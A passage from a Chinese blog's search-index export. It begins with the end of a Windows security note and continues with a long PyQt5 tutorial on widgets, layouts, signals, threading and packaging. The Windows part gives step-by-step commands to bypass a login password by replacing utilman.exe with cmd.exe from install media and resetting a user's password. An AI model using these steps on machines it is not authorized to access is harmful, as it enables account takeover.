同步时钟</span><br><span class="line">w32tm /resync</span><br></pre></td></tr></table></figure><h3 id="3-绕过windows密码"><a href="#3-绕过windows密码" class="headerlink" title="3 绕过windows密码"></a>3 绕过windows密码</h3><blockquote><p>下载：<a href="https://www.microsoft.com/zh-cn/software-download/windows10到U盘中">https://www.microsoft.com/zh-cn/software-download/windows10到U盘中</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过BIOS到安装位置，按shift+f10弹出cmd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有可用的驱动器</span></span><br><span class="line">wmic logicaldisk get name</span><br><span class="line"><span class="comment"># 找到位置并改掉轻松访问（因为轻松访问对应utilman.exe）</span></span><br><span class="line">C: </span><br><span class="line"><span class="built_in">cd</span> windows/system32</span><br><span class="line">ren utilman.exe utilman2.exe</span><br><span class="line">copy cmd.exe utilman.exe</span><br><span class="line"><span class="comment"># 点击轻松访问</span></span><br><span class="line">net user username <span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 操作系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 计算机系统 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PyQt5</title>
      <link href="/posts/9898eb96.html"/>
      <url>/posts/9898eb96.html</url>
      
        <content type="html"><![CDATA[<h1 id="PyQt5"><a href="#PyQt5" class="headerlink" title="PyQt5"></a>PyQt5</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><hr><h2 id="一、PyQt5安装"><a href="#一、PyQt5安装" class="headerlink" title="一、PyQt5安装"></a>一、PyQt5安装</h2><blockquote><p><a href="https://riverbankcomputing.com/static/Docs/PyQt5/api/qtcore/qtcore-module.html">PyQt5库</a></p><p><a href="https://doc.qt.io/qt-5/qtwidgets-module.html">C++PyQt5库</a></p></blockquote><ul><li><p>安装</p><p><code>pip install PyQt5 -i https://pypi.douban.com/simple</code></p></li></ul><hr><h2 id="二、QT-designer"><a href="#二、QT-designer" class="headerlink" title="二、QT designer"></a>二、QT designer</h2><ul><li><p>安装</p><blockquote><p><a href="https://blog.csdn.net/weixin_40883833/article/details/126333030">安装</a>    <a href="https://blog.csdn.net/weixin_40883833/article/details/126333046">配置</a>    <a href="https://www.cnblogs.com/-dawn/p/15717899.html">版本问题</a>    <a href="https://www.modb.pro/db/112043">3.9.0a4不行</a></p><p>pip install PyQt5-tools -i <a href="https://pypi.douban.com/simple">https://pypi.douban.com/simple</a></p><p>python版本要在 3.10 以下</p><p>pycharm External Tools页面位置：File &gt; Settings &gt; Tools &gt; External Tools </p></blockquote></li><li><p>配置工具</p><ul><li><p>Name：QtDesigner</p><blockquote><p><code>Program：（Python安装路径）\Lib\site-packages\qt5_applications\Qt\bin\designer.exe</code></p><p><code>Working directory：$ProjectFileDir$</code></p></blockquote></li><li><p>QtDesigner制作UI界面，生成.ui文件，需要通过PyUIC转换成.py文件。</p><blockquote><p><code>Name：PyUIC</code></p><p><code>Program：（Python安装路径）</code></p><p><code>Arguments：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</code></p><p><code>Working directory：$FileDir$</code></p></blockquote></li></ul><ul><li><p>PyRcc可以将图片、数据文件资源打包成py文件。    </p><blockquote><p><code>Name：PyRcc</code></p><p><code>Program：（Python安装路径）</code></p><p><code>Arguments：-m PyQt5.pyrcc_main $FileName$ -o $FileNameWithoutExtension$_rc.py</code></p><p><code>Working directory：$FileDir$</code></p></blockquote></li></ul></li><li><p>QT designer使用</p><ul><li><p>加载ui文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> uic</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    ui = uic.loadUi(<span class="string">&quot;./untitled.ui&quot;</span>)</span><br><span class="line">    ui.show()</span><br><span class="line">    app.exec_()</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="三、PyQt5-QtWidgets"><a href="#三、PyQt5-QtWidgets" class="headerlink" title="三、PyQt5.QtWidgets"></a>三、PyQt5.QtWidgets</h2><h3 id="1-窗口"><a href="#1-窗口" class="headerlink" title="1 窗口"></a>1 窗口</h3><h4 id="1-1-简单案例"><a href="#1-1-简单案例" class="headerlink" title="1.1 简单案例"></a>1.1 简单案例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># 调用本程序</span></span><br><span class="line">app = QApplication(sys.argv)</span><br><span class="line"><span class="comment"># 设置名称</span></span><br><span class="line">app.setApplicationName(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line"><span class="comment"># 初始化窗体</span></span><br><span class="line">w = QWidget()</span><br><span class="line"><span class="comment"># 设置窗口标题</span></span><br><span class="line">w.setWindowTitle(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line"><span class="comment"># 展示窗口</span></span><br><span class="line">w.show()</span><br><span class="line"><span class="comment"># 程序进行循环等待状态</span></span><br><span class="line">app.exec_()</span><br></pre></td></tr></table></figure><h4 id="1-2-格式案例"><a href="#1-2-格式案例" class="headerlink" title="1.2 格式案例"></a>1.2 格式案例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyWindow, self).__init__()</span><br><span class="line">        <span class="comment"># 设置窗口标题</span></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;系统&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    w = MyWindow()</span><br><span class="line">    w.show()</span><br><span class="line">    app.exec_()</span><br></pre></td></tr></table></figure><h4 id="1-3-窗口类型"><a href="#1-3-窗口类型" class="headerlink" title="1.3 窗口类型"></a>1.3 窗口类型</h4><ul><li>QWidget：控件和窗口的父类，自由度高（无其他区域），没有划分菜单、工具栏、状态栏、主窗口等区域。</li><li>QMainWindow：是 QWidget 的子类，包含菜单栏、工具栏、状态栏、标题栏等，中间部分则为主窗口区域。</li><li>QDialog：对话框窗口的基类。</li><li>QMessage：消息窗口。</li></ul><h4 id="1-4-QDialog"><a href="#1-4-QDialog" class="headerlink" title="1.4 QDialog"></a>1.4 QDialog</h4><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81539733">QDialog</a></p></blockquote><ul><li><p>QFileDialog</p><blockquote><p> <a href="https://blog.csdn.net/jia666666/article/details/81560756">QFileDialog</a></p><p>例：<code>image_file, _ =QFileDialog.getOpenFileName(self,&#39;Open file&#39;,&#39;C:\\&#39;,&#39;Image files (*.jpg *.gif *.png *.jpeg)&#39;)</code></p></blockquote><ol><li>self：用于指定父组件。</li><li>‘open file’：是QFileDialog对话框的标题。</li><li>‘C:\’默认打开的目录，Linux 和 Windows 杠不同，””表示当前目录。</li><li>对话框中文件扩展名过滤器（fliter）,比如使用’Image files (.jpg .gif .png .jpeg)’表示只能显示扩展名为.jpg,.gif等文件。</li></ol></li></ul><h4 id="1-5-QMessage"><a href="#1-5-QMessage" class="headerlink" title="1.5 QMessage"></a>1.5 QMessage</h4><ul><li><p>函数</p><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81540785">QMessage</a></p><p>QMessageBox.Critical：错误窗口</p></blockquote></li></ul><h4 id="1-6-窗口属性"><a href="#1-6-窗口属性" class="headerlink" title="1.6 窗口属性"></a>1.6 窗口属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置窗口大小</span></span><br><span class="line">obj.resize(x,y)</span><br><span class="line"><span class="comment"># 移动屏幕至目标位置</span></span><br><span class="line">obj.move(x,y)</span><br><span class="line"><span class="comment"># 对象的 x , y , w , h</span></span><br><span class="line">obj.frameGeometry()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置风格</span></span><br><span class="line">obj.setStyleSheet(<span class="string">&quot;backgroud-color:grey;&quot;</span>)</span><br><span class="line"><span class="comment"># 设置中心内容显示</span></span><br><span class="line">obj.setCentralWidget(label)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac菜单栏会在屏幕顶部而非程序顶部，该设置为真可以让Mac也同Windows一样</span></span><br><span class="line">menu.setNativeMenuBar(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h4 id="1-7-案例"><a href="#1-7-案例" class="headerlink" title="1.7 案例"></a>1.7 案例</h4><ul><li><p>隐藏标题栏</p><blockquote><p><a href="https://blog.csdn.net/marwenx/article/details/107226153">隐藏标题栏</a></p><p><code>self.setWindowFlags(QtCore.Qt.CustomizeWindowHint)</code></p></blockquote></li><li><p>设置窗口显示在正中心</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">width = <span class="number">300</span></span><br><span class="line">height = <span class="number">300</span></span><br><span class="line">window.resize(width , height)</span><br><span class="line"><span class="comment"># 获得物体左上角的点在中心的坐标</span></span><br><span class="line">center_point = QDesktopWidget().availableGeometry().center()    </span><br><span class="line">x = center_point.x()</span><br><span class="line">y = center_point.y()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法1：</span></span><br><span class="line">window.move(x - width // <span class="number">2</span>,y - height // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：</span></span><br><span class="line"><span class="comment"># 获得框架的 x , y , w , h</span></span><br><span class="line">old_x,old_y,wi,he = w.frameGeometry().getRect()    </span><br><span class="line">window.move(x - wi // <span class="number">2</span>, y - he // <span class="number">2</span>)</span><br><span class="line">window.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接设置</span></span><br><span class="line">self.setCentralWidget(container)</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="2-控件"><a href="#2-控件" class="headerlink" title="2 控件"></a>2 控件</h3><h4 id="2-1-按钮"><a href="#2-1-按钮" class="headerlink" title="2.1 按钮"></a>2.1 按钮</h4><blockquote><p><a href="https://www.cnblogs.com/ygzhaof/p/10059540.html">按钮</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 展现按钮</span></span><br><span class="line"><span class="built_in">bin</span> = QPushButton( <span class="string">&quot;按钮&quot;</span> )</span><br><span class="line"><span class="built_in">bin</span>.setParent( window )  <span class="comment"># 在父物体上展示</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">bin</span> = QPushButton( <span class="string">&quot;按钮&quot;</span> , w )</span><br></pre></td></tr></table></figure><h4 id="2-2-文本"><a href="#2-2-文本" class="headerlink" title="2.2 文本"></a>2.2 文本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 标签</span></span><br><span class="line">label = QLabel(<span class="string">&quot;账号:&quot;</span>, window )</span><br></pre></td></tr></table></figure><h4 id="2-3-文本框"><a href="#2-3-文本框" class="headerlink" title="2.3 文本框"></a>2.3 文本框</h4><blockquote><p><a href="https://zhuanlan.zhihu.com/p/34323103">QPlainTextEdit</a>   </p><p><a href="https://blog.csdn.net/sinat_41752325/article/details/128516594">常用信号</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QLineEdit</span></span><br><span class="line"><span class="comment"># 文本框</span></span><br><span class="line">line = QLineEdit( window )</span><br><span class="line"><span class="comment"># 函数结束才显示文本</span></span><br><span class="line">line.setPlainText(res)</span><br><span class="line"><span class="comment"># 框中自动显示文本</span></span><br><span class="line">line.setPlaceholderText( <span class="string">&quot;text&quot;</span> )</span><br><span class="line"><span class="comment"># 获得文本</span></span><br><span class="line">line.text()</span><br><span class="line"></span><br><span class="line"><span class="comment"># QPlainTextEdit，类记事本。</span></span><br><span class="line">text = QPlainTextEdit()</span><br><span class="line"><span class="comment"># 获得文本</span></span><br><span class="line">text.toPlainText()</span><br><span class="line"></span><br><span class="line">undo <span class="comment"># 撤回</span></span><br><span class="line">redo <span class="comment"># 前进</span></span><br></pre></td></tr></table></figure><h4 id="2-4-选项框"><a href="#2-4-选项框" class="headerlink" title="2.4 选项框"></a>2.4 选项框</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选项组</span></span><br><span class="line">hobby_box = QGroupBox(<span class="string">&quot;爱好&quot;</span>)</span><br><span class="line"><span class="comment"># 单个选项</span></span><br><span class="line">bt1 = QRadioButton(<span class="string">&quot;抽烟&quot;</span>)</span><br><span class="line"><span class="comment"># 添加按钮到组</span></span><br><span class="line">hobby_box.addButton(bt1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下拉框</span></span><br><span class="line">Qbox = QComboBox()</span><br><span class="line"><span class="comment"># 添加选项们到下拉框中，字典，键是名字，值是返回值。</span></span><br><span class="line">Qbox.addItems(<span class="built_in">dict</span>)</span><br><span class="line"><span class="comment"># 下拉框值改变发送信号</span></span><br><span class="line">QBox.currentTextChanged[<span class="built_in">str</span>].connect(slot)</span><br></pre></td></tr></table></figure><h4 id="2-5-滚动对象"><a href="#2-5-滚动对象" class="headerlink" title="2.5 滚动对象"></a>2.5 滚动对象</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">QScrollArea()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加自动滚动条</span></span><br><span class="line">scroll = QScrollArea()</span><br><span class="line">v_layout = QVBoxLayout()</span><br><span class="line">v_layout.addWidget(scroll)</span><br></pre></td></tr></table></figure><h4 id="2-6-计数器"><a href="#2-6-计数器" class="headerlink" title="2.6 计数器"></a>2.6 计数器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计数器</span></span><br><span class="line">spin = QSpinBox()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置范围</span></span><br><span class="line">spin.setRange(<span class="built_in">min</span>,<span class="built_in">max</span>,[step=<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 其他单个设置</span></span><br><span class="line">spin.spin.setMinimum()</span><br><span class="line">spin.setMaximum()</span><br><span class="line">spin.setValue()</span><br><span class="line">spin.singleStep()</span><br><span class="line"><span class="comment"># 返回属性值</span></span><br><span class="line">spin.value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 值改变信号</span></span><br><span class="line">spin.valueChanged.connect(slot)</span><br></pre></td></tr></table></figure><h4 id="2-7-表格"><a href="#2-7-表格" class="headerlink" title="2.7 表格"></a>2.7 表格</h4><blockquote><p><a href="https://www.cnblogs.com/linyfeng/p/11832237.html">author::QTableWidget</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.table_widget = QTableWidget()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置表格行列数</span></span><br><span class="line">self.table_widget.setRowCount(row)</span><br><span class="line">self.table_widget.setColumnCount(col)  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 隐藏行数显示</span></span><br><span class="line">self.table_widget.verticalHeader().setVisible(<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置表头</span></span><br><span class="line">self.table_widget.setHorizontalHeaderLabels([ <span class="string">&quot;账号&quot;</span>, <span class="string">&quot;密码&quot;</span>])</span><br><span class="line"><span class="comment"># 表头加粗</span></span><br><span class="line">font = self.table_widget.horizontalHeader().font()</span><br><span class="line">font.setBold(<span class="literal">True</span>)</span><br><span class="line">self.table_widget.horizontalHeader().setFont(font)</span><br><span class="line"><span class="comment"># 表列宽</span></span><br><span class="line">self.table_widget.horizontalHeader().resizeSection(index,size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用编辑功能</span></span><br><span class="line">item.setFlags(item.flags() &amp; ~Qt.ItemIsEditable)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绑定监听双击</span></span><br><span class="line">self.table_widget.cellDoubleClicked.connect(self.inspect)  <span class="comment"># 连接双击信号和 inspect 槽函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inspect</span>(<span class="params">self,row,col</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Clicked on row:&quot;</span>, row)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Clicked on column:&quot;</span>, col)</span><br></pre></td></tr></table></figure><h4 id="2-8-控件属性"><a href="#2-8-控件属性" class="headerlink" title="2.8 控件属性"></a>2.8 控件属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回属性值</span></span><br><span class="line">obj.value()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置位置和宽高</span></span><br><span class="line">obj.setGeometry(x,y,w,h)</span><br><span class="line"><span class="comment"># 设置固定宽高</span></span><br><span class="line">obj.setFixedSize(x,y)</span><br><span class="line"><span class="comment"># 框架的 x , y</span></span><br><span class="line">obj.frameSize()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动换行</span></span><br><span class="line">obj.setWordWrap(<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 显示内容靠上</span></span><br><span class="line">obj.setAlignment(Qt.AlignTop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置文本（html）</span></span><br><span class="line">obj.setText / setPlainText(text)</span><br><span class="line"><span class="comment"># 设置注释（在下面）</span></span><br><span class="line">obj.setStatusTip(text)</span><br><span class="line"><span class="comment"># 设置快捷键</span></span><br><span class="line">obj.setShortcut(<span class="string">&quot;Ctrl+N&quot;</span>)</span><br><span class="line"><span class="comment"># 设置文本框显示格式（全窗口显示或非全窗口显示）</span></span><br><span class="line">setLineWrapMode(<span class="number">1</span> <span class="keyword">if</span> text.lineWrapMode() == <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有新内容则进行更新</span></span><br><span class="line">obj.repaint()</span><br><span class="line"></span><br><span class="line"><span class="comment"># CSS格式的样式设置</span></span><br><span class="line">setStyleSheet(css);</span><br><span class="line">bt.setStyleSheet(<span class="string">&#x27;border: 1px solid black; padding: 10px; font-size: 24px&#x27;</span>) </span><br></pre></td></tr></table></figure><hr><h3 id="3-基础布局"><a href="#3-基础布局" class="headerlink" title="3 基础布局"></a>3 基础布局</h3><h4 id="3-1-盒子"><a href="#3-1-盒子" class="headerlink" title="3.1 盒子"></a>3.1 盒子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">QHBoxLayout <span class="comment"># 水平</span></span><br><span class="line">QVBoxLayout <span class="comment"># 垂直</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置布局规则并应用布局</span></span><br><span class="line">layout = QVBoxLayout()</span><br><span class="line">window.setLayout(layout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加控件到布局器中</span></span><br><span class="line">layout.addWidget(obj)</span><br><span class="line"><span class="comment"># 添加一个伸缩器，挤压空间，num是与其他伸缩器的比例</span></span><br><span class="line">layout.addStretch([num])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 布局嵌套</span></span><br><span class="line">layout.addWidget(layout)</span><br></pre></td></tr></table></figure><h4 id="3-2-网格"><a href="#3-2-网格" class="headerlink" title="3.2 网格"></a>3.2 网格</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网格布局，九宫格布局</span></span><br><span class="line">QGridLayout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加控件到布局器中（第几行第几列）</span></span><br><span class="line">layout.addWidget(obj,row,col)</span><br><span class="line"><span class="comment"># 添加布局器到布局器中</span></span><br><span class="line">layout.addLayout(bt)</span><br></pre></td></tr></table></figure><h4 id="3-3-表单"><a href="#3-3-表单" class="headerlink" title="3.3 表单"></a>3.3 表单</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 表单</span></span><br><span class="line">QFormLayout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加控件在同一行</span></span><br><span class="line">layout.addRow(obj_1 , obj_2 , ...)</span><br></pre></td></tr></table></figure><h4 id="3-4-抽屉"><a href="#3-4-抽屉" class="headerlink" title="3.4 抽屉"></a>3.4 抽屉</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 控件抽屉</span></span><br><span class="line">stacked_layout = QStackedLayout()</span><br><span class="line"><span class="comment"># 界面抽屉</span></span><br><span class="line">stacked_widget = QStackWidget()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置抽屉显示（默认为0）</span></span><br><span class="line">stack.setCurrentIndex(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 添加控件入屉</span></span><br><span class="line">stacked_layout.addChildLayout(init_layout)</span><br><span class="line">stacked_widget.addWidget(init_layout)</span><br></pre></td></tr></table></figure><h4 id="3-5-布局属性"><a href="#3-5-布局属性" class="headerlink" title="3.5 布局属性"></a>3.5 布局属性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加部件，alianment对齐方式</span></span><br><span class="line">Box.addWidget(layout,alignment=Qt.AlignCenter)</span><br><span class="line"><span class="comment"># 属性：Qt.AlignTop,QTabWidget.AlignBottom,QTabWidget.AlignLeft,Qt.AlignRight,Qt.AlignHCenter,Qt.AlignBottom</span></span><br></pre></td></tr></table></figure><hr><h3 id="4-顶端栏"><a href="#4-顶端栏" class="headerlink" title="4 顶端栏"></a>4 顶端栏</h3><h4 id="4-1-顶端栏"><a href="#4-1-顶端栏" class="headerlink" title="4.1 顶端栏"></a>4.1 顶端栏</h4><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81589679">QMenuBar</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置菜单栏并加到栏目选项内。（不能分开）</span></span><br><span class="line">menu = self.menuBar().addMenu(<span class="string">&quot;&amp;name&quot;</span>)</span><br><span class="line"><span class="comment"># 添加菜单选项</span></span><br><span class="line">file_menu.addAction(name)</span><br></pre></td></tr></table></figure><h4 id="4-2-状态栏"><a href="#4-2-状态栏" class="headerlink" title="4.2 状态栏"></a>4.2 状态栏</h4><blockquote><p><a href="https://blog.csdn.net/jia666666/article/details/81589928">QStatuBar </a>   <a href="https://blog.csdn.net/jia666666/article/details/81589803">QToolBar</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QStatusBar</span></span><br><span class="line"><span class="comment"># 初始化状态栏</span></span><br><span class="line">self.status = QStatusBar()</span><br><span class="line"><span class="comment"># 加入到窗口中</span></span><br><span class="line">self.setStatusBar(self.status)</span><br><span class="line"></span><br><span class="line"><span class="comment"># QToolBar</span></span><br><span class="line"><span class="comment"># 初始化工具栏</span></span><br><span class="line">self.status = QToolBar()</span><br><span class="line"><span class="comment"># 添加分割线</span></span><br><span class="line">obj.addSeparator()</span><br></pre></td></tr></table></figure><hr><h2 id="四、PyQt5-QtGui"><a href="#四、PyQt5-QtGui" class="headerlink" title="四、PyQt5.QtGui"></a>四、PyQt5.QtGui</h2><h3 id="1-图标"><a href="#1-图标" class="headerlink" title="1 图标"></a>1 图标</h3><blockquote><p><a href="https://blog.csdn.net/seniorwizard/article/details/109820641">QAction</a>    </p><p><a href="https://www.easyicon.cc/">图标网</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加图标</span></span><br><span class="line">window.setWindowIcon(QIcon(<span class="string">&quot;img.png&quot;</span>))</span><br><span class="line"><span class="comment"># 设置宽高</span></span><br><span class="line">widget.setIconSzie(Qsize(w,h))</span><br><span class="line"></span><br><span class="line"><span class="comment"># QAction，用于菜单栏、工具栏或自定义快捷键的抽象动作行为。</span></span><br><span class="line">QAction</span><br></pre></td></tr></table></figure><h3 id="2-字体"><a href="#2-字体" class="headerlink" title="2 字体"></a>2 字体</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># QFont初始化字体类</span></span><br><span class="line">font = QFont()</span><br><span class="line"></span><br><span class="line"><span class="comment"># QFontDatabase，提供了关于底层窗口系统中可用字体的信息。</span></span><br><span class="line">QFontDatabase</span><br><span class="line"><span class="comment"># 设置字体，返回字体（type：QFontDatabase.FixedFont）</span></span><br><span class="line">fixedfont = QFontDatabase.systemFont( <span class="built_in">type</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置字大小</span></span><br><span class="line">fixedfont.setPointSize(num)</span><br><span class="line"><span class="comment"># 设置字加粗</span></span><br><span class="line">fixedfont.setBold(<span class="built_in">bool</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加到控件中</span></span><br><span class="line">self.editor.setFont(fixedfont)</span><br></pre></td></tr></table></figure><hr><h2 id="五、PyQt5-QtCore"><a href="#五、PyQt5-QtCore" class="headerlink" title="五、PyQt5.QtCore"></a>五、PyQt5.QtCore</h2><h3 id="1-信号与槽"><a href="#1-信号与槽" class="headerlink" title="1 信号与槽"></a>1 信号与槽</h3><ul><li><p>链接    </p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/617157844">信号与槽</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对象.信号.connect( 槽函数 )，绑定信号与槽</span></span><br><span class="line">obj.signal.connect( slot )</span><br><span class="line"><span class="comment"># 发射信号触发槽（括号中填入槽函数参数，可多个）</span></span><br><span class="line">obj.signal.emit( func_argv )</span><br><span class="line"></span><br><span class="line"><span class="comment"># slot 传参</span></span><br><span class="line"><span class="keyword">lambda</span>: self.func( a , b , ... )</span><br></pre></td></tr></table></figure></li><li><p>signal</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 点击</span></span><br><span class="line">clicked</span><br><span class="line"><span class="comment"># 触发器</span></span><br><span class="line">triggered</span><br><span class="line"><span class="comment"># 当前文本值改变</span></span><br><span class="line">currentTextChanged[<span class="built_in">str</span>]</span><br><span class="line"><span class="comment"># 值改变</span></span><br><span class="line">valueChanged</span><br></pre></td></tr></table></figure></li><li><p>自定义信号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注：只作类变量（str，[dict]，[list]）</span></span><br><span class="line">my_signal = pyqtSignal( <span class="built_in">str</span> , .... )：</span><br><span class="line"><span class="comment"># 然后绑定信号，发送信号</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="2-多线程"><a href="#2-多线程" class="headerlink" title="2 多线程"></a>2 多线程</h3><ul><li><p>创建线程与使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主函数</span></span><br><span class="line">self.ui = MyThread()</span><br><span class="line">self.ui.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>( <span class="title class_ inherited__">QThread</span> ):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params"> self </span>):</span><br><span class="line">    <span class="comment"># start</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p>多线程信号</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主线程</span></span><br><span class="line"><span class="comment"># 主线程函数，信号值存入res中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_Text</span>(<span class="params">self,res</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 主函数绑定信号发送给类中什么函数，然后启动线程</span></span><br><span class="line">self.attack = AttackThread() </span><br><span class="line"><span class="comment"># 绑定子线程接受信号函数</span></span><br><span class="line">self.attack.receive_signal.connect(attack.receive_Signal)</span><br><span class="line"><span class="comment"># 绑定子线程发送给主线程的函数</span></span><br><span class="line">self.attack.send_signal.connect(self.update_Text)</span><br><span class="line"><span class="comment"># 可以提前发送一个信号给子线程</span></span><br><span class="line">self.attack.receive_signal.emit(para)</span><br><span class="line"><span class="comment"># 启动子线程，子线程运行run</span></span><br><span class="line">self.attack.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 子线程</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AttackThread</span>(<span class="title class_ inherited__">QThread</span>):</span><br><span class="line">    <span class="comment"># 初始化自定义信号和信号类型</span></span><br><span class="line">    receive_signal = pyqtSignal(<span class="built_in">list</span>)</span><br><span class="line">    send_signal = pyqtSignal(<span class="built_in">str</span>)</span><br><span class="line">    <span class="comment"># 定义接受主线程的函数，信号值存入para中</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">receive_Signal</span>(<span class="params">self,para</span>): <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="六、打包"><a href="#六、打包" class="headerlink" title="六、打包"></a>六、打包</h2><ul><li><p>窗口化应用程序作为单文件可执行文件</p><p><code>pyinstaller --onefile --windowed myfile.py</code></p></li></ul><hr><h2 id="七、问题"><a href="#七、问题" class="headerlink" title="七、问题"></a>七、问题</h2><h3 id="1-QtWebEngineWidgets"><a 